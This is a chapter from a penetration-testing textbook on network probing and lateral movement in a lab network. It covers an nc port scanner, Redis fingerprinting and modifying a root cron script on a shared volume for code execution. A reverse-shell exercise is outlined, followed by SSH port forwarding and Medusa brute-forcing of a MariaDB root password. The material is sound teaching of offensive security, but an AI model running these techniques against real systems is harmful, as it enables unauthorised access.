<html><head></head><body>
<section epub:type="chapter" role="doc-chapter" aria-labelledby="ch11">&#13;
<hgroup>&#13;
<h1 class="CHAPTER" id="ch11">&#13;
<span class="CN"><span role="doc-pagebreak" epub:type="pagebreak" id="pg_257" aria-label="257"/><span class="SANS_Futura_Std_Bold_Condensed_B_11">11</span></span>&#13;
<span class="CT"><span class="SANS_Dogma_OT_Bold_B_11">NETWORK PROBING AND LATERAL MOVEMENT</span></span>&#13;
</h1>&#13;
</hgroup>&#13;
<figure class="opener"><img class="opener" src="../images/opener.jpg" alt=""/></figure>&#13;
<p class="COS">The network or machine to which you initially gain access during a penetration test might offer little of value. By moving laterally through a target’s environment, you can find crown jewels such as adjacent networks, databases, application servers, file-sharing servers, and more.</p>&#13;
<p class="TX">As a penetration tester, you’ll quickly learn that real-life enterprise environments emphasize the security of their externally facing assets: those that are exposed to the wild and noisy internet. This is because the external perimeter is considered to be a greater risk than the internal networks used by trusted users such as employees.</p>&#13;
<p class="TX">Whereas companies may have only a handful of internet-facing assets, such as marketing websites or other web servers, their internal networks are often target rich. You may find printers, network switches, employee computers, file servers, smart devices, and more once you land on an organization’s internal network.</p>&#13;
<p class="TX"><span role="doc-pagebreak" epub:type="pagebreak" id="pg_258" aria-label="258"/>To identify and then access these resources, you can repeat steps we’ve already covered: performing reconnaissance, gathering valuable network information, identifying and exploiting vulnerabilities, and compromising endpoints connected to the network of interest. As such, this chapter will reinforce lessons from earlier in the book to scan an internally accessible network and identify additional assets, though we’ll highlight a few new techniques.</p>&#13;
<p class="TX">The examples will target the lab environment’s corporate network (10.1.0.0/24). Before continuing, we recommend you take a second look at <a href="chapter3.xhtml#fig3-2">Figure 3.2</a> on <a href="chapter3.xhtml#pg_58">page 58</a> to refresh your memory regarding the available networks in the lab—namely, the public and corporate networks.</p>&#13;
<p class="TX">The machines <i>p-jumpbox-01</i> (172.16.10.13) and <i>p-web-02</i> (172.16.10.12) are the only ones with a leg in both the public and corporate networks. Each machine has two network interfaces, allowing them to be part of both networks. As such, we’ll perform some of the attacks in this chapter from these machines; we’ll execute the others from Kali by using port forwarding.</p>&#13;
<section epub:type="division" aria-labelledby="sec1">&#13;
<h2 class="H1" id="sec1"><span id="h1-93"/><span class="SANS_Futura_Std_Bold_B_11">Probing the Corporate Network</span></h2>&#13;
<p class="TNI1">We have yet to collect information about the 10.1.0.0/24 corporate network. In this section, we’ll build a small port scanner that uses special files to map found ports to named services and speed up port scanning by prioritizing ports based on how frequently they’re found open in the wild. Internal networks tend to host far more assets than a penetration tester might see from the outside, so tweaking your processes and tools can help accelerate this asset discovery.</p>&#13;
<p class="TX">We’ll perform a network scan from the <i>p-jumpbox-01</i> (172.16.10.13) machine by using tools available on the operating system. Note that you could also modify and reuse some of the port-scanning and information-gathering scripts used so far in the book.</p>&#13;
<section epub:type="division" aria-labelledby="sec2">&#13;
<h3 class="H2" id="sec2"><span id="h2-157"/><span class="SANS_Futura_Std_Bold_Condensed_Oblique_BI_11">Service Mapping</span></h3>&#13;
<p class="TNI1">On Linux, the <i>/etc/services</i> file maps services to the port numbers assigned by the Internet Assigned Numbers Authority. The file contains a few columns separated by tabs, such as the service name, the port number and protocol (for example, <span class="SANS_TheSansMonoCd_W5Regular_11">22/tcp</span>), and the description of the service. Here is a snippet of the /<i>etc/services</i> file from <i>p-jumpbox-01</i>:</p>&#13;
<pre><code>$ <b>grep -w -e 3306/tcp -e 3389/tcp -e 22/tcp -e 23/tcp -e 25/tcp /etc/services</b>&#13;
&#13;
ssh                22/tcp          # SSH Remote Login Protocol&#13;
telnet             23/tcp&#13;
smtp               25/tcp          mail&#13;
mysql            3306/tcp&#13;
ms-wbt-server    3389/tcp&#13;
</code></pre>&#13;
<p class="TX"><span role="doc-pagebreak" epub:type="pagebreak" id="pg_259" aria-label="259"/>With <span class="SANS_TheSansMonoCd_W5Regular_11">grep</span>, we use <span class="SANS_TheSansMonoCd_W5Regular_11">-w</span> to perform a whole-word match and use <span class="SANS_TheSansMonoCd_W5Regular_11">-e</span> to look for multiple TCP ports. We can use this file to iterate through common ports and identify the services they’re likely running. <a href="chapter11.xhtml#Lis11-1">Listing 11-1</a> is a bash script that takes advantage of <i>/etc/services</i> in this way. It uses Ncat installed on <i>p-jumpbox-01</i> for the port scanning.</p>&#13;
<span id="Lis11-1"/><pre><code>#!/bin/bash&#13;
TARGETS=("$@") <span class="codewide_CodeAnnotation" aria-label="annotation1">❶</span>&#13;
&#13;
print_help(){&#13;
  echo "Usage: ${0} &lt;LIST OF IPS&gt;"&#13;
  echo "${0} 10.1.0.1 10.1.0.2 10.1.0.3"&#13;
}&#13;
&#13;
if [[${#TARGETS[@]} -eq 0]]; then <span class="codewide_CodeAnnotation" aria-label="annotation2">❷</span>&#13;
  echo "Must provide one or more IP addresses!"&#13;
  print_help <span class="codewide_CodeAnnotation" aria-label="annotation3">❸</span>&#13;
  exit 1&#13;
fi&#13;
&#13;
for target in "${TARGETS[@]}"; do <span class="codewide_CodeAnnotation" aria-label="annotation4">❹</span>&#13;
  while read -r port; do&#13;
    if timeout 1 nc -i 1 "${target}" -v "${port}" 2&gt;&amp;1 | grep -q "Connected to"; then <span class="codewide_CodeAnnotation" aria-label="annotation5">❺</span>&#13;
      echo "IP: ${target}"&#13;
      echo "Port: ${port}"&#13;
      echo "Service: $(grep -w "${port}/tcp" /etc/services | awk '{print $1}')"&#13;
    fi&#13;
  done &lt; &lt;(grep "/tcp" /etc/services | awk '{print $2}' | tr -d '/tcp') <span class="codewide_CodeAnnotation" aria-label="annotation6">❻</span>&#13;
done&#13;
</code></pre>&#13;
<p class="ListingCaption"><span class="Futura_Std_Book_Oblique_I">Listing 11-1: Performing port scanning by using</span> <span class="SANS_Futura_Std_Book_11">/etc/services</span> <span class="Futura_Std_Book_Oblique_I">as a database file</span></p>&#13;
<p class="TX">At <span class="CodeAnnotation" aria-label="annotation1">❶</span>, we define the <span class="SANS_TheSansMonoCd_W5Regular_11">TARGETS=()</span> array variable, using <span class="SANS_TheSansMonoCd_W5Regular_11">"$@"</span> inside the parentheses to assign any command line arguments passed to the script to this array. We then use an <span class="SANS_TheSansMonoCd_W5Regular_11">if</span> condition to check whether the <span class="SANS_TheSansMonoCd_W5Regular_11">TARGETS</span> array is empty <span class="CodeAnnotation" aria-label="annotation2">❷</span>. If so, we print a help message <span class="CodeAnnotation" aria-label="annotation3">❸</span> by using the <span class="SANS_TheSansMonoCd_W5Regular_11">print_help()</span> function.</p>&#13;
<p class="TX">We iterate through the <span class="SANS_TheSansMonoCd_W5Regular_11">TARGETS</span> array <span class="CodeAnnotation" aria-label="annotation4">❹</span>. We also iterate through all the TCP ports in <i>/etc/services</i> by using a <span class="SANS_TheSansMonoCd_W5Regular_11">while</span> loop <span class="CodeAnnotation" aria-label="annotation6">❻</span>, then connect to the target and port by using the <span class="SANS_TheSansMonoCd_W5Regular_11">nc</span> command <span class="CodeAnnotation" aria-label="annotation5">❺</span>. If the port is found open, we print the target, the port, and the service name mapping from <i>/etc/services</i>. The script should output the following when run against <i>c-backup-01</i> (10.1.0.13) and <i>c-redis-01</i> (10.1.0.14):</p>&#13;
<pre><code>$ <b>./port_scan_etc_services.sh 10.1.0.13 10.1.0.14</b>&#13;
&#13;
IP: 10.1.0.13&#13;
Port: 8080&#13;
Service: http-alt&#13;
IP: 10.1.0.14&#13;
Port: 22&#13;
Service: ssh&#13;
<span role="doc-pagebreak" epub:type="pagebreak" id="pg_260" aria-label="260"/>IP: 10.1.0.14&#13;
Port: 6379&#13;
Service: redis&#13;
</code></pre>&#13;
<p class="TX">As you can see, we’ve identified a few open ports and their commonly assigned service names. For example, we see that the key-value database Redis often uses port 6379.</p>&#13;
<p class="TX">Services can run on alternative ports, however, so you’ll need to fingerprint them. To do this for port 6379, pipe a Redis <span class="SANS_TheSansMonoCd_W5Regular_11">INFO</span> command to the <span class="SANS_TheSansMonoCd_W5Regular_11">nc</span> command (<a href="chapter11.xhtml#Lis11-2">Listing 11-2</a>).</p>&#13;
<span id="Lis11-2"/><pre><code>$ <b>echo -e '\nINFO' | nc -v 10.1.0.14 6379</b>&#13;
&#13;
<var>--snip--</var>&#13;
Ncat: (https://nmap.org/ncat)&#13;
Ncat: Connected to 10.1.0.14:6379.&#13;
$3249&#13;
# Server&#13;
redis_version:5.0.6&#13;
redis_git_sha1:00000000&#13;
redis_git_dirty:0&#13;
redis_build_id:24cefa6406f92a1f&#13;
redis_mode:standalone&#13;
os:Linux 6.1.0-kali5-amd64 x86_64&#13;
arch_bits:64&#13;
multiplexing_api:epoll&#13;
atomicvar_api:atomic-builtin&#13;
<var>--snip--</var>&#13;
</code></pre>&#13;
<p class="ListingCaption"><span class="Futura_Std_Book_Oblique_I">Listing 11-2: Fingerprinting the service running on a port</span></p>&#13;
<p class="TX">This is a typical response from a Redis server; we’ll return to this service in <span class="Xref">“Compromising a Redis Server” on <a href="#pg_271">page 271</a></span>. Continue by scanning the remaining machines, <i>c-db-01</i> (10.1.0.15) and <i>c-db-02</i> (10.1.0.16), to identify any other ports that are available.</p>&#13;
</section>&#13;
<section epub:type="division" aria-labelledby="sec3">&#13;
<h3 class="H2" id="sec3"><span id="h2-158"/><span class="SANS_Futura_Std_Bold_Condensed_Oblique_BI_11">Port Frequencies</span></h3>&#13;
<p class="TNI1">The <i>/etc/services</i> file offers a simple port-to-service-name mapping, but we can improve it. Nmap has a file called <i>nmap-services</i> (usually located at <i>/usr/share/ nmap/nmap-services</i>) that looks almost identical to <i>/etc/services</i> but has one advantage: it includes the <i>port open frequency</i>, a numerical value that describes how often a port is seen open, such as 0.18010. For instance, common network services like HTTP or HTTPS are far more common to see than spooling services.</p>&#13;
<p class="TX">Let’s take a look at this file. The command in <a href="chapter11.xhtml#Lis11-3">Listing 11-3</a> filters for port 22 (SSH), port 23 (Telnet), port 3306 (MySQL), and port 1433 (Microsoft SQL). Execute the command on Kali, then observe the frequency values:</p>&#13;
<span id="Lis11-3"/><pre><code><span role="doc-pagebreak" epub:type="pagebreak" id="pg_261" aria-label="261"/>$<b> grep -w -e 22/tcp -e 23/tcp -e 3306/tcp -e 1433/tcp /usr/share/nmap/nmap-services</b>&#13;
&#13;
ssh         22/tcp      0.182286    # Secure Shell Login&#13;
telnet      23/tcp      0.221265&#13;
ms-sql-s    1433/tcp    0.007929    # Microsoft-SQL-Server&#13;
mysql       3306/tcp    0.045390&#13;
</code></pre>&#13;
<p class="ListingCaption"><span class="Futura_Std_Book_Oblique_I">Listing 11-3: Viewing only certain ports in the</span> <span class="SANS_Futura_Std_Book_11">/etc/services</span> <span class="Futura_Std_Book_Oblique_I">file</span></p>&#13;
<p class="TX">Telnet (0.221265) is open more frequently than SSH (0.182286), while MySQL (0.045390) is open more frequently than Microsoft SQL (0.007929). This frequency data helps us prioritize which ports to scan, remove ports that are not commonly seen open, and focus on a limited subset of ports while reducing the risk of missing out on key services. In Exercise 23, we’ll build a scanner that scans for ports based on their open frequency.</p>&#13;
<p class="TX">Note that while service names are associated with the found ports, those may not necessarily reflect the services that are actually running. Files such as <i>/etc/services</i> and <i>nmap-services</i> use a static mapping of ports and services, so it’s up to us to properly identify the service during a penetration test by connecting to each port.</p>&#13;
<p class="TX">We encourage you to perform additional information gathering on these hosts by using what you’ve learned so far in the book. Can you identify applications or databases that are running, along with their versions? How about the running operating system? In the subsequent sections, we’ll exploit some of these services to gain access to additional machines and move laterally through the network.</p>&#13;
<p class="HeadAExercise"><span id="exe-23"/><span class="SANS_Futura_Std_Heavy_B_15">Exercise 23: Scanning Ports Based on Frequencies</span></p>&#13;
<p class="TNI1">In this exercise, you’ll perform a similar port scan to the one in <a href="chapter11.xhtml#Lis11-1">Listing 11-1</a>, except you’ll examine the frequency at which a port is found open and prioritize commonly opened ports. Here is what you’ll do, at a high level:</p>&#13;
<p class="NLF">  1.  On Kali, extract the services, ports, and their open frequency values from the <i>/usr/share/nmap/nmap-services</i> file. Write them to a new file or integrate them into a script.</p>&#13;
<p class="NL">  2.  Sort the ports from the highest frequency to the lowest by using commands such as <span class="SANS_TheSansMonoCd_W5Regular_11">sort</span> and <span class="SANS_TheSansMonoCd_W5Regular_11">awk</span>.</p>&#13;
<p class="NLL">  3.  Create a port-scanning script that iterates through the frequency-ordered ports and returns the result in some format.</p>&#13;
<p class="TX">You can go about this in various ways, and we encourage you to write the script by using your own logic. If you get stuck, try modifying the script in <a href="chapter11.xhtml#Lis11-1">Listing 11-1</a>. <a href="chapter11.xhtml#Lis11-4">Listing 11-4</a> shows how you might sort the ports in the <i>nmap-services</i> file by frequency.</p>&#13;
<span id="Lis11-4"/><pre><code><span role="doc-pagebreak" epub:type="pagebreak" id="pg_262" aria-label="262"/>$ <b>grep "/tcp" /usr/share/nmap/nmap-services | sort -r -k 3 | awk '{print $1, $2, $3}'</b>&#13;
&#13;
http 80/tcp 0.484143&#13;
telnet 23/tcp 0.221265&#13;
https 443/tcp 0.208669&#13;
ftp 21/tcp 0.197667&#13;
ssh 22/tcp 0.182286&#13;
smtp 25/tcp 0.131314&#13;
ms-wbt-server 3389/tcp 0.083904&#13;
pop3 110/tcp 0.077142&#13;
microsoft-ds 445/tcp 0.056944&#13;
netbios-ssn 139/tcp 0.050809&#13;
<var>--snip--</var>&#13;
</code></pre>&#13;
<p class="ListingCaption"><span class="Futura_Std_Book_Oblique_I">Listing 11-4: Ordering the</span> <span class="SANS_Futura_Std_Book_11">nmap-services</span> <span class="Futura_Std_Book_Oblique_I">file by frequency</span></p>&#13;
<p class="TX">We use <span class="SANS_TheSansMonoCd_W5Regular_11">grep "/tcp"</span> to filter for TCP-based ports only. We then pipe the result to the <span class="SANS_TheSansMonoCd_W5Regular_11">sort</span> command and pass it <span class="SANS_TheSansMonoCd_W5Regular_11">-r</span> (reverse) <span class="SANS_TheSansMonoCd_W5Regular_11">-k</span> (key) followed by <span class="SANS_TheSansMonoCd_W5Regular_11">3</span>, which represents the frequency column (third). We print only the first, second, and third fields, using <span class="SANS_TheSansMonoCd_W5Regular_11">awk</span> for a cleaner output. This gives us an ordered list of ports, which will give you an idea of which ports are more common.</p>&#13;
<p class="TX">Now that you have a list, the next step is to either hardcode this list into your script and iterate over it or write the content to a file and have the bash script iterate over the lines in the file. The direction you choose is ultimately up to you. However, hardcoding a large list will make the script hard to read unless you shortlist only a handful of ports, so we recommend writing it to a dedicated file.</p>&#13;
<p class="TX">To test your script, copy it to <i>p-jumpbox-01</i> (172.16.10.13) and run it against the list of targets to identify any services running on the 10.1.0.0/24 corporate network. You should see output similar to this:</p>&#13;
<pre><code>$ <b>./port_scan_with_frequency.sh 10.1.0.13 10.1.0.14 10.1.0.15 10.1.0.16</b>&#13;
&#13;
IP: 10.1.0.13&#13;
Port: 8080&#13;
Service: http-alt&#13;
IP: 10.1.0.14&#13;
Port: 6379&#13;
Service: redis&#13;
IP: 10.1.0.15&#13;
Port: 80&#13;
Service: http&#13;
IP: 10.1.0.16&#13;
Port: 3306&#13;
Service: mysql&#13;
</code></pre>&#13;
<p class="TX">Keep in mind that the scan can take a couple of minutes to complete.</p>&#13;
</section>&#13;
</section>&#13;
<section epub:type="division" aria-labelledby="sec4">&#13;
<h2 class="H1" id="sec4"><span id="h1-94"/><span role="doc-pagebreak" epub:type="pagebreak" id="pg_263" aria-label="263"/><span class="SANS_Futura_Std_Bold_B_11">Exploiting Cron Scripts on Shared Volumes</span></h2>&#13;
<p class="TNI1">Now that we’ve gathered information about the corporate network, we’ll exploit various vulnerable services to gain access to it. Cron jobs may sometimes execute scripts that live on volumes shared by multiple machines. If system administrators misconfigure their permissions, unauthorized users may be able to modify them, which could potentially impact systems that rely on those scripts.</p>&#13;
<p class="TX">Notice that on <i>p-web-01</i> (172.16.10.10) a volume is mounted on <i>/mnt/scripts</i>. You can see it by running the commands <span class="SANS_TheSansMonoCd_W5Regular_11">mount</span> or <span class="SANS_TheSansMonoCd_W5Regular_11">df -hTP</span> on the server:</p>&#13;
<pre><code>$ <b>df -hTP | grep "/mnt/scripts"</b>&#13;
/dev/sda1      ext4      79G   26G   50G  34% /mnt/scripts&#13;
&#13;
$ <b>mount | grep "/mnt/scripts"</b>&#13;
/dev/sda1 on /mnt/scripts type ext4 (rw,relatime,errors=remount-ro)&#13;
</code></pre>&#13;
<p class="TX">Inside this directory is a script called <i>execute.sh</i> that the <i>root</i> user owns and can write to. <a href="chapter11.xhtml#Lis11-5">Listing 11-5</a> shows its contents.</p>&#13;
<span id="Lis11-5"/><pre><code>#!/bin/bash&#13;
&#13;
# This script is executed every minute on c-backup-01 to do maintenance work.&#13;
&#13;
<span class="codeannotated_CodeAnnotation" aria-label="annotation1">❶</span> LOG="/tmp/job.log"&#13;
&#13;
echo "$(date) - Starting cleanup script..." &gt;&gt; "$LOG"&#13;
<span class="codeannotated_CodeAnnotation" aria-label="annotation2">❷</span> if find /tmp -type f ! -name 'job.log' -exec rm -rf {} +; then&#13;
<span class="Code_CodeAnnotation" aria-label="annotation3">❸</span> echo "cleaned up files from the /tmp folder."  &gt;&gt; "$LOG"&#13;
fi&#13;
&#13;
echo "$(date) - Cleanup script is finished." &gt;&gt; "$LOG"&#13;
</code></pre>&#13;
<p class="ListingCaption"><span class="Futura_Std_Book_Oblique_I">Listing 11-5: The</span> <span class="SANS_Futura_Std_Book_11">/mnt/scripts/execute.sh</span> <span class="Futura_Std_Book_Oblique_I">file</span></p>&#13;
<p class="TX">The comment in the script indicates that it is executed on the machine <i>c-backup-01</i> (10.1.0.13) every minute. We can infer that the network share and this script are both available on <i>c-backup-01</i>.</p>&#13;
<p class="TX">Let’s dissect what this script does. At <span class="CodeAnnotation" aria-label="annotation1">❶</span>, the variable <span class="SANS_TheSansMonoCd_W5Regular_11">LOG</span> is set to the filepath <i>/tmp/job.log</i>. At <span class="CodeAnnotation" aria-label="annotation2">❷</span>, an <span class="SANS_TheSansMonoCd_W5Regular_11">if</span> condition checks the exit status of <span class="SANS_TheSansMonoCd_W5Regular_11">find</span>. The <span class="SANS_TheSansMonoCd_W5Regular_11">find</span> command searches for any files under the <i>/tmp</i> directory that are not named <i>job.log</i>; the exclamation point (<span class="SANS_TheSansMonoCd_W5Regular_11">!</span>) is a NOT operator in this case. If the <span class="SANS_TheSansMonoCd_W5Regular_11">find</span> command finds any such files, <span class="SANS_TheSansMonoCd_W5Regular_11">-exec rm -rf {}</span> <span class="SANS_TheSansMonoCd_W5Regular_11">+</span> is executed, removing these files from the system. At <span class="CodeAnnotation" aria-label="annotation3">❸</span>, an <span class="SANS_TheSansMonoCd_W5Regular_11">echo</span> command writes the removed files into the logfile set up at <span class="CodeAnnotation" aria-label="annotation1">❶</span>.</p>&#13;
<p class="TX">This entire script is essentially a directory cleanup tool that empties the <i>/tmp</i> directory every minute by using a cron job running on <i>c-backup-01</i>. Because this bash script exists on a volume mounted on two machines, one of which we have root access on, we can try to modify it to get <i>c-backup-01</i> to run our custom instructions. There’s one challenge, however: while the volume is <span role="doc-pagebreak" epub:type="pagebreak" id="pg_264" aria-label="264"/>shared with both <i>p-web-01</i> and <i>c-backup-01</i>, these machines aren’t on the same network. <a href="chapter11.xhtml#fig11-1">Figure 11-1</a> illustrates how the machines are connected.</p>&#13;
<figure class="IMG"><img id="fig11-1" class="img1" src="../images/pg264.jpg" alt=""/>&#13;
<figcaption><p class="CAP"><span class="SANS_Futura_Std_Book_Oblique_I_11">Figure 11-1: The indirect network access between</span> <span class="SANS_Futura_Std_Book_11">p-web-01</span> <span class="SANS_Futura_Std_Book_Oblique_I_11">and</span> <span class="SANS_Futura_Std_Book_11">c-backup-01</span></p></figcaption>&#13;
</figure>&#13;
<p class="TX">While <i>p-web-01</i> does not have direct access to the corporate network, <i>p-web-02</i> does. This means we’ll modify the <i>execute.sh</i> script from <i>p-web-01</i> but try to interact with <i>c-backup-01</i> via <i>p-web-02</i>.</p>&#13;
<section epub:type="division" aria-labelledby="sec5">&#13;
<h3 class="H2" id="sec5"><span id="h2-159"/><span class="SANS_Futura_Std_Bold_Condensed_Oblique_BI_11">Verifying Exploitability</span></h3>&#13;
<p class="TNI1">To verify whether <i>c-backup-01</i> is in fact executing the <i>execute.sh</i> script, we need it to emit a signal. This signal could be a network packet sent to a listener we open; alternatively, we could force <i>c-backup-01</i> to create a file in the shared drive. Let’s try this. On <i>p-web-01</i> (172.16.10.10), add the following line to the end of <i>/mnt/script/execute.sh</i>:</p>&#13;
<pre><code>touch "/mnt/scripts/$(hostname).txt"</code></pre>&#13;
<p class="TX">Since the script claims to run every minute, we need to monitor the file-creation event so we can see it before the file is deleted. We can do so using the <span class="SANS_TheSansMonoCd_W5Regular_11">watch</span> command. <a href="chapter11.xhtml#Lis11-6">Listing 11-6</a> will run the <span class="SANS_TheSansMonoCd_W5Regular_11">ls -l</span> command and refresh the output every two seconds.</p>&#13;
<span id="Lis11-6"/><pre><code>$ <b>watch -d 'ls -l'</b>&#13;
&#13;
Every 2.0s: ls -l     p-web-01.acme-infinity-servers.com: Sat&#13;
&#13;
total 8&#13;
-rw-r--r-- 1 root root 0 Nov 4 18:13 c-backup-01.acme-infinity-servers.com.txt&#13;
-rwxr--r-- 1 root root 529 Nov 4 18:08 execute.sh&#13;
</code></pre>&#13;
<p class="ListingCaption"><span class="Futura_Std_Book_Oblique_I">Listing 11-6: Using the watch command to monitor file changes</span></p>&#13;
<p class="TX"><span role="doc-pagebreak" epub:type="pagebreak" id="pg_265" aria-label="265"/>As you can see, the <i>c-backup-01.acme-infinity-servers.com.txt</i> file appears, indicating that <i>c-backup-01</i> is in fact executing this script.</p>&#13;
</section>&#13;
<section epub:type="division" aria-labelledby="sec6">&#13;
<h3 class="H2" id="sec6"><span id="h2-160"/><span class="SANS_Futura_Std_Bold_Condensed_Oblique_BI_11">Checking the User Context</span></h3>&#13;
<p class="TNI1">Cron jobs can be run by dedicated users, but in certain cases, they may run as the <i>root</i> user. This could happen out of convenience or may be a security oversight. To verify the user context with which the script is running, we can add commands to the file to capture the hostname, the identity of the user running the cron job, and the list of all the processes running on the system:</p>&#13;
<pre><code>echo "Hostname: $(hostname)" &gt; /mnt/scripts/$(hostname).txt&#13;
echo "Identity: $(id)" &gt;&gt; /mnt/scripts/$(hostname).txt&#13;
echo "Processes: $(ps aux)" &gt;&gt; /mnt/scripts/$(hostname).txt&#13;
</code></pre>&#13;
<p class="TX">Repeat the <span class="SANS_TheSansMonoCd_W5Regular_11">watch</span> command from <a href="chapter11.xhtml#Lis11-4">Listing 11-4</a> to see the new content written into the file. Once content is written, run <span class="SANS_TheSansMonoCd_W7Bold_B_11">cat</span> to see the result:</p>&#13;
<pre><code>$ <b>cat /mnt/scripts/c-backup-01*</b>&#13;
&#13;
Hostname: c-backup-01.acme-infinity-servers.com&#13;
Identity: uid=0(root) gid=0(root) groups=0(root)&#13;
Processes:&#13;
USER     PID   %CPU %MEM  VSZ   RSS TTY  STAT START TIME COMMAND&#13;
<var>--snip--</var>&#13;
root     1812  0.0  0.0   2732   924 ?   Ss 18:23  0:00 /bin/sh -c bash /mnt/scripts/execute.sh&#13;
root     1813  0.0  0.0   4244  3196 ?   S  18:23  0:00 bash /mnt/scripts/execute.sh&#13;
root     1823  0.0  0.0   8204  4000 ?   R  18:23  0:00 ps aux&#13;
</code></pre>&#13;
<p class="TX">The script is running as root. This means we have full command execution ability under the root context. From here, we can do pretty much anything, such as viewing files owned by the <i>root</i> user, like <i>/etc/shadow</i>; writing custom files into key system directories; copying files to a remote server; and adding users.</p>&#13;
<p class="HeadAExercise"><span id="exe-24"/><span class="SANS_Futura_Std_Heavy_B_15">Exercise 24: Gaining a Reverse Shell on the Backup Server</span></p>&#13;
<p class="TNI1">While the vulnerability in the cron job script discovered in the previous section gives us an unlimited ability to execute commands on <i>c-backup-01</i> (10.1.0.13), we don’t yet have a shell on the server. Let’s get one.</p>&#13;
<p class="TX">No machine on the corporate network has internet access. You’ll have to find another way to transfer any additional tools you may need to complete a full compromise over the corporate network. How to establish the reverse shell is ultimately up to you, but here is high-level guidance you can follow:</p>&#13;
<p class="NLF">  1.  Open a shell listener on a machine you have access to that can access the corporate network, such as <i>p-web-02</i> (172.16.10.12).</p>&#13;
<p class="NL"><span role="doc-pagebreak" epub:type="pagebreak" id="pg_266" aria-label="266"/>  2.  If the tools to establish a reverse shell listener aren’t available, make them available from another remote location, such as by running a web server on your main Kali machine containing the necessary tools.</p>&#13;
<p class="NL">  3.  Modify the vulnerable <i>execute.sh</i> script described in the previous section to send a shell over the network to the listener.</p>&#13;
<p class="NLL">  4.  Verify that you have shell access as the <i>root</i> user.</p>&#13;
</section>&#13;
</section>&#13;
<section epub:type="division" aria-labelledby="sec7">&#13;
<h2 class="H1" id="sec7"><span id="h1-95"/><span class="SANS_Futura_Std_Bold_B_11">Exploiting a Database Server</span></h2>&#13;
<p class="TNI1">Earlier in this chapter, we identified a potential MySQL service on <i>c-db-02</i> (10.1.0.16). We can verify whether this is indeed a database by probing the port. Run the following command from <i>p-jumpbox-01</i> (172.16.10.13) to learn about the service:</p>&#13;
<pre><code>$ <b>nc -v 10.1.0.16 3306</b>&#13;
&#13;
Ncat: Connected to 10.1.0.16:3306.&#13;
5.5.5-10.6.4-MariaDB-1:10.6.4&#13;
</code></pre>&#13;
<p class="TX">The database on <i>c-backup-01</i> is a MariaDB server. It uses TCP port 3306, similarly to MySQL. Accessing a database’s management console requires a username and sometimes a password, if set by an administrator. In this section, we’ll attempt to brute-force the database to gain remote access to it.</p>&#13;
<section epub:type="division" aria-labelledby="sec8">&#13;
<h3 class="H2" id="sec8"><span id="h2-161"/><span class="SANS_Futura_Std_Bold_Condensed_Oblique_BI_11">Port Forwarding</span></h3>&#13;
<p class="TNI1">Although both <i>p-jumpbox-01</i> and <i>p-web-02</i> are connected to the corporate network, neither has an installed database client we could use to connect with. To get around this, we can use port forwarding and the tools available on Kali to brute-force the database. We’ll establish a local port forward from the Kali machine by using an intermediate jump host, <i>p-jumpbox-01</i> (172.16.10.13).</p>&#13;
<p class="TX">We can perform the port forwarding by using the command in <a href="chapter11.xhtml#Lis11-7">Listing 11-7</a>.</p>&#13;
<span id="Lis11-7"/><pre><code>$ <b>ssh -v -N -L 3306:10.1.0.16:3306 backup@172.16.10.13</b></code></pre>&#13;
<p class="ListingCaption"><span class="Futura_Std_Book_Oblique_I">Listing 11-7: Port forwarding with SSH</span></p>&#13;
<p class="TX">This command uses local port forwarding (<span class="SANS_TheSansMonoCd_W5Regular_11">-L</span>) and the syntax <span class="SANS_TheSansMonoCd_W5Regular_Italic_I_11">local_port:remote_ip:remote_port</span>, followed by the intermediate host through which the forwarding will be done. After executing this command, you’ll be prompted to enter the password for the <span class="Italic">backup</span> user on <i>p-jumpbox-01</i>. As a reminder, the password is <i>backup</i>.</p>&#13;
<p class="TX">Once the command successfully executes, Kali will start listening locally on port 3306. Verify that port 3306 is listening by using the following command:</p>&#13;
<pre><code><span role="doc-pagebreak" epub:type="pagebreak" id="pg_267" aria-label="267"/>$ <b>netstat -atunp | grep 3306</b>&#13;
&#13;
<var>--snip--</var>&#13;
tcp   0   0 127.0.0.1:3306   0.0.0.0:*   LISTEN 86790/ssh&#13;
<var>--snip—</var>&#13;
</code></pre>&#13;
<p class="TX">Any traffic destined to 127.0.0.1:3306 on Kali will be sent to <i>c-db-02</i> (10.1.0.16) on port 3306 via the intermediate host <i>p-jumpbox-01</i>.</p>&#13;
</section>&#13;
<section epub:type="division" aria-labelledby="sec9">&#13;
<h3 class="H2" id="sec9"><span id="h2-162"/><span class="SANS_Futura_Std_Bold_Condensed_Oblique_BI_11">Brute-Forcing with Medusa</span></h3>&#13;
<p class="TNI1">Now that we can run attacks from Kali, we can use a preinstalled tool such as Medusa to brute-force the database. The following command uses Medusa’s <i>mysql</i> module, which works against MariaDB servers, to achieve the task:</p>&#13;
<pre><code>$ <b>medusa -h 127.0.0.1 -u root -P /usr/share/metasploit-framework/data/</b>&#13;
<b>wordlists/unix_users.txt -M mysql</b>&#13;
</code></pre>&#13;
<p class="TX">We use the <span class="SANS_TheSansMonoCd_W5Regular_11">medusa</span> command with the arguments <span class="SANS_TheSansMonoCd_W5Regular_11">-h</span> (host), <span class="SANS_TheSansMonoCd_W5Regular_11">-u</span> (user), <span class="SANS_TheSansMonoCd_W5Regular_11">-P</span> (password file), and <span class="SANS_TheSansMonoCd_W5Regular_11">-M</span> (module), specifying the 127.0.0.1 host, the root user, the password file <i>/usr/share/metasploit-framework/data/wordlists/unix_users.txt</i>, and <i>mysql</i>. Medusa will brute-force the root account by using a list of passwords from the <i>unix_users.txt</i> file. Let Medusa run for a few minutes until it finds the password:</p>&#13;
<pre><code><var>--snip--</var>&#13;
ACCOUNT CHECK: [mysql] Host: 127.0.0.1 User: root Password: redsocks&#13;
ACCOUNT CHECK: [mysql] Host: 127.0.0.1 User: root Password: rfindd&#13;
ACCOUNT CHECK: [mysql] Host: 127.0.0.1 User: root Password: rje&#13;
ACCOUNT CHECK: [mysql] Host: 127.0.0.1 User: root Password: root&#13;
<b>ACCOUNT FOUND: [mysql] Host: 127.0.0.1 User: root Password: root [SUCCESS]</b>&#13;
</code></pre>&#13;
<p class="TX">Great, Medusa found that the password for the <i>root</i> user is <i>root</i>. Let’s try to connect to the database. From Kali, run the following command:</p>&#13;
<pre><code>$ <b>mysql -h 127.0.0.1 -u root -p</b>&#13;
&#13;
Welcome to the MariaDB monitor.  Commands end with ; or \g.&#13;
Your MariaDB connection id is 32&#13;
<var>--snip--</var>&#13;
&#13;
Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.&#13;
&#13;
MariaDB [(none)]&gt;&#13;
</code></pre>&#13;
